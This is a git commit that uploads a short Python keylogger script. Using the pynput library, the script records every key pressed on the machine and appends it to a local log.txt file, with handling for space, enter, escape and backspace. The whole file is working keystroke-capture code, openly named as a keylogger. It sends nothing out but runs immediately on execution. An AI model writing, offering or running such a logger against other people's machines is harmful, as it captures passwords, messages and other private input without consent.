c56bd5842006bcfd70ff3c9748cc6f7a3d0d80ff
Thxnz <82960702+Thxnz@users.noreply.github.com>
2022-09-24 16:33:26 -0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,55 @@
+# it only creates a file with the words typed !!
+
+from pynput.keyboard import Key, Listener
+import os
+
+
+
+
+class KeyLogger():    
+
+    def __init__(self):
+
+        self.log = "INITIALING...   "
+
+        # for not confliting!!
+        if os.path.exists("log.txt"):
+            os.remove("log.txt")
+        
+    def on_press(self, key):
+
+        file = open("log.txt","a")
+
+        try:
+
+            file.write(str(key).replace("'",""))
+
+        except AttributeError:                
+
+            if key == Key.space:
+
+                file.write(" ")
+
+            elif key == Key.esc:
+
+                file.write("ESC")
+
+            elif key == Key.enter:
+
+                file.write("\n")
+
+            elif key == Key.backspace:
+                
+                file.write("<BACKSPACE>")
+            
+            else:                
+            
+                file.write(""+str(key)+"")
+           
+    def run(self):
+        with Listener(on_press=self.on_press) as keyboard_listener:
+            keyboard_listener.join()
+
+
+keylogger = KeyLogger()
+keylogger.run()
